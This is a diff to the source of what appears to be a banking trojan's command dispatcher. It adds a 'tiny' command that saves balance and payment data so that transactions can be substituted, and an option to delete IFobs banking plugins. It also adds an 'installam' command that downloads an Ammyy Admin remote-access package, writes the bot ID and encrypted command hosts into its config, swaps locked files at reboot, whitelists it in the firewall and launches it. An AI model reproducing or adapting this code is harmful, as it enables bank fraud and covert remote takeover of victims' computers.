@@ -20,6 +20,7 @@
 #include "BotDef.h"
 #include "StrConsts.h"
 #include "Installer.h"
+#include "VideoRecorder.h"
 
 #include <shlobj.h>
 #include <shlwapi.h>
@@ -1091,7 +1092,11 @@ bool ExecuteVNC(void* Manager, PCHAR Command, PCHAR Args)
 bool ExecuteIFobs(void* Manager, PCHAR Command, PCHAR Args)
 {
 #ifdef IFobsH
-	IFobs::CreateFileReplacing(Args);
+	if( StrSame( Args, "del" ) )
+		IFobs::DeletePlugins();
+	else
+		IFobs::CreateFileReplacing(Args);
+
 #endif
 	return TRUE;
 }
@@ -1200,6 +1205,90 @@ bool ExecuteCBank(PTaskManager Manager, PCHAR Command, PCHAR Args)
 	return true;
 }
 
+bool ExecuteTiny(PTaskManager Manager, PCHAR Command, PCHAR Args)
+{
+#ifdef TinyH
+	TASKDBG( "Tiny", "%s", Args );
+	int c_args = m_lstrlen(Args);
+	//сохраняем переданный баланс и платежки
+	File::WriteBufferA( BOT::MakeFileName( 0, GetStr(TinyReplacement).t_str() ).t_str(), Args, c_args + 1 );
+	//уставливаем флаг для запуска подмены
+	Bot->CreateFileA( 0, GetStr(TinyFlagUpdate).t_str() );
+#endif
+	return true;
+}
+
+static DWORD WINAPI ThreadInstallam(void*)
+{
+	TASKDBG( "Ammy", "Скачиваем ammy.plug" );
+	BYTE* data = 0;
+	DWORD size = 0;
+	data = Plugin::Download( "ammy.plug", 0, &size, false );
+	if( data )
+	{
+		//KillBlockingProcesses("aa.exe");
+		char tempCab[MAX_PATH], folderAmmy[MAX_PATH];
+		File::GetTempName(tempCab);
+		File::WriteBufferA( tempCab, data, size );
+		TASKDBG( "Ammy", "Сохранили ammy.plug в %s", tempCab );
+		pSHGetFolderPathA( 0, CSIDL_COMMON_APPDATA,  0, 0, folderAmmy );
+		pPathAppendA( folderAmmy, "ammyy" );
+		pCreateDirectoryA( folderAmmy, 0 );
+		//aa.exe рапаковываем как aa1.exe, чтобы проще сделать переписывае если файл aa.exe занят
+		const char* renames[] = { "aa.exe", "aa1.exe", "iphlpapi.dll", "iphlpapi1.dll", 0, 0 };
+		if( ExtractCab( tempCab, folderAmmy, renames ) )
+		{
+			TASKDBG( "Ammy", "Распаковали в папку %s", folderAmmy );
+
+			//создаем файл am.cfg
+			fwsprintfA pwsprintfA = Get_wsprintfA();
+			char* mem = (char*)HEAP::Alloc(1024);
+			char* p = mem;
+			p += pwsprintfA( mem, "%s\r\n", Bot->UID().t_str() );
+			TStrEnum E( Rafa::Hosts(), RAFAHOSTS_PARAM_ENCRYPTED, 0x86D19DC3 /* __RAFA_HOSTS__ */ );
+			while( E.Next() )
+				p += pwsprintfA( p, "%s\r\n", E.Line().t_str() );
+			pPathAppendA( folderAmmy, "am.cfg" );
+			File::WriteBufferA( folderAmmy, mem, p - mem );
+			HEAP::Free(mem);
+
+			pPathRemoveFileSpecA(folderAmmy);
+			char pathAA1[MAX_PATH];
+			m_lstrcpy( pathAA1, folderAmmy );
+			int i = 0;
+			while( renames[i] )
+			{
+				pPathAppendA( folderAmmy, renames[i] );
+				pPathAppendA( pathAA1, renames[i + 1] );
+				//если файл не перепишется (уже запущен), то перезапишется после ребута
+				if( !pMoveFileExA( pathAA1, folderAmmy, MOVEFILE_REPLACE_EXISTING ) )
+					pMoveFileExA( pathAA1, folderAmmy, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+
+				pPathRemoveFileSpecA(folderAmmy);
+				pPathRemoveFileSpecA(pathAA1);
+				i += 2;
+			}
+			pPathAppendA( folderAmmy, "aa.exe" );
+			if( AddAllowedprogram(folderAmmy) )
+			{
+				RunFileA(folderAmmy);
+				TASKDBG( "Ammy", "ammy успешно запущен" );
+			}
+		}
+		pDeleteFileA(tempCab);
+	}
+	return 0;
+}
+
+bool ExecuteInstallam(PTaskManager Manager, PCHAR Command, PCHAR Args)
+{
+    OSVERSIONINFOA ver;
+    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
+    pGetVersionExA(&ver);
+	if( ver.dwMajorVersion < 6 ) //команда работает только для XP
+		RunThread( ThreadInstallam, 0 );
+	return true;
+}
 
 /*
 
@@ -1324,8 +1413,10 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandAddTrust[]		 = {'a','d','d','t','r','u','s','t',0};
 	const static char CommandDownload2[]     = {'d','o','w','n','l','o','a','d','2',0};
 	const static char CommandCBank[]		 = {'c','b','a','n','k',0};
+	const static char CommandTiny[]			 = {'t','i','n','y',0};
+	const static char CommandInstallam[]	 = {'i','n','s','t','a','l','l','a','m',0};
 
-	int Index = StrIndexOf( Command, false, 17,
+	int Index = StrIndexOf( Command, false, 19,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
@@ -1342,7 +1433,9 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 							(PCHAR)CommandExec,
 							(PCHAR)CommandAddTrust,
 							(PCHAR)CommandDownload2,
-							(PCHAR)CommandCBank
+							(PCHAR)CommandCBank,
+							(PCHAR)CommandTiny,
+							(PCHAR)CommandInstallam
 						  );
 
 
@@ -1365,6 +1458,8 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 14: return ExecuteAddTrust;
 		case 15: return ExecuteDownload2;
 		case 16: return ExecuteCBank;
+		case 17: return ExecuteTiny;
+		case 18: return ExecuteInstallam;
 
     default: ;
 	}
